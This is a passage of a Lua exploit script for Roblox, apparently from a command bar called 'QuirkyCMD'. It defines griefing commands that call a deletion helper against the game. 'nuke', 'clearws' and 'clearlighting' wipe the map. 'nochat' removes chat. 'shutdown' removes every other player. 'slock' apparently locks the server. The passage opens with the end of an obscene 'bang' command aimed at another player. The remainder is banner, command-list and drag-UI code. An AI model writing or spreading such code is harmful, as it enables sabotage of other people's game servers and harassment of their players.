		character:PivotTo(root.CFrame * CFrame.new(0, 0.75, 1.1))
	end)
	table.insert(connections,bangLoop)
end)

addCommand("unbang", function()
	if bangDied then bangDied:Disconnect() end
	if bang then bang:Stop() end
	if bangAnim then bangAnim:Destroy() end
	if bangLoop then bangLoop:Disconnect() end
end)

addCommand("clearstarter", function()
	for i,v in pairs(game:GetService("StarterGui"):GetChildren()) do
		delete(v)
	end
	for i,v in pairs(game:GetService("StarterPack"):GetChildren()) do
		delete(v)
	end
	for i,v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterPlayerScripts"):GetChildren()) do
		delete(v)
	end
	for i,v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts"):GetChildren()) do
		delete(v)
	end
	
end)

addCommand("nochat",function()
	local chatEvents = rStorage:FindFirstChild("DefaultChatSystemChatEvents")
	if chatEvents then return delete(chatEvents) end
	for i,v in pairs(game:GetService("TextChatService"):GetChildren()) do
		delete(v)
	end
end)

addCommand("clearws", function()
	for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		delete(v)
	end
end)

addCommand("notextures", function()
	for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		for _,instance in pairs({v, table.unpack(v:GetDescendants())}) do
			if not (instance:IsA("Decal") or instance:IsA("Texture")) then continue end
			delete(instance)
		end
	end
end)

addCommand("platform", function()
	for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		for _,instance in pairs({v, table.unpack(v:GetDescendants())}) do
			if not (instance:IsA("BasePart")) then continue end
			if not character then return end
			local hum = character:FindFirstChildOfClass("Humanoid")
			if not hum then return end
			local hrp = hum.RootPart
			if not hrp then return end
			local mag = (hrp.Position - instance.Position).Magnitude
			if mag <= 5 or instance.Size.Magnitude >= 100  or instance.Name:lower():gsub(" ",""):find("baseplate") then continue end
			delete(instance)
		end
	end
end)

addCommand("nospawns", function()
	for i,v in pairs(workspace:GetDescendants()) do
		if not v:IsA("SpawnLocation") then continue end
		delete(v)
	end
end)

addCommand("unweldws", function()
	for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		for _, instance in pairs(v:GetDescendants()) do
			if not (instance:IsA("Weld") or instance:IsA("Attachment")) then continue end
			delete(instance)
		end
		if not (v:IsA("Weld") or v:IsA("Attachment")) then continue end
		delete(v)
	end
end)

addCommand("noseats", function()
	for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		for _, instance in pairs(v:GetDescendants()) do
			if not (instance:IsA("VehicleSeat") or instance:IsA("Seat")) then continue end
			delete(instance)
		end
		if not (v:IsA("VehicleSeat") or v:IsA("Seat")) then continue end
		delete(v)
	end
end)

addCommand("nosounds",function()
	for i,v in pairs(game:GetDescendants()) do
		if not v:IsA("Sound") then continue end
		delete(v)
	end
end)

addCommand("clearlighting",function()
	for i,v in pairs(game:GetService("Lighting"):GetChildren()) do
		delete(v)
	end
end)

addCommand("shutdown", function()
	for i,v in pairs(players:GetPlayers()) do
		if i == 1 then continue end
		delete(v)
	end
	delete(localPlayer)
end)

addCommand("nuke",function() 
	for i,v in pairs(workspace:GetChildren()) do
		delete(v)
	end

	for i,v in pairs(players:GetPlayers()) do
		if i == 1 then continue end
		delete(v)
	end
end)

addCommand("slock",function()
	slockEnabled = true
end)

addCommand("unslock", function()
	slockEnabled = false
end)

addCommand("close", abort)

--[[Add scrolling command list]]--
local scrollText = "QuirkyCMD made by smokedoutlocedout | type cmds for a list of commands | "
if not isMobile then
	scrollText ..= "press ; to open/close command bar | "
end
local charCount = 12
local spaces = 0
local scrollSpeed = 0.12 -- sec/char
local sample = scrollText..string.rep(" ", spaces)
local displayString = sample:sub(1, charCount)
local strlen = string.len(sample)

local counter = 1
local timer = 0

for i,v in pairs(scrollText:split("")) do
	if v ~= " " then continue end
	spaces += 1
end

table.insert(connections, rs.Heartbeat:Connect(function(dt)
	timer += dt
	if timer > scrollSpeed then
		while timer > scrollSpeed do
			timer -= scrollSpeed
			counter = (counter + 1)%strlen
		end

		if counter + charCount <= strlen then
			displayString = sample:sub(counter, counter + charCount)
		else
			displayString = sample:sub(counter, strlen)..sample:sub(1, counter + charCount - strlen)
		end
	end

	box.PlaceholderText = (("%s"):format(displayString))
end))

--[[Sort commands alphabetically]]--
table.sort(commands, function(a,b)
	return a.name < b.name
end)

--[[Add command list logic]]--
for i,v in pairs(commands) do
	local clone = cmdTemplate:Clone()
	clone.Text = v.name
	clone.Visible = true
	clone.Parent = cmdsList
end

table.insert(connections, closeButton.MouseButton1Click:Connect(function()
	cmdsFrame.Visible = false
end))

--[[Add drag functionality]]--
local dragging
local dragInput
local dragStart
local startPos

local lastMousePos
local lastGoalPos
local DRAG_SPEED = 20

local function update(dt)
	if not (startPos) then return end;
	if not (dragging) and (lastGoalPos) then
		cmdsFrame.Position = UDim2.new(startPos.X.Scale, lerp(cmdsFrame.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, lerp(cmdsFrame.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
		return 
	end;

	local delta = (lastMousePos - uis:GetMouseLocation())
	local xGoal = (startPos.X.Offset - delta.X);
	local yGoal = (startPos.Y.Offset - delta.Y);
	lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
	cmdsFrame.Position = UDim2.new(startPos.X.Scale, lerp(cmdsFrame.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, lerp(cmdsFrame.Position.Y.Offset, yGoal, dt * DRAG_SPEED))	
end;

cmdsFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = cmdsFrame.Position
		lastMousePos = uis:GetMouseLocation()

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

cmdsFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

table.insert(connections,rs.Heartbeat:Connect(update))
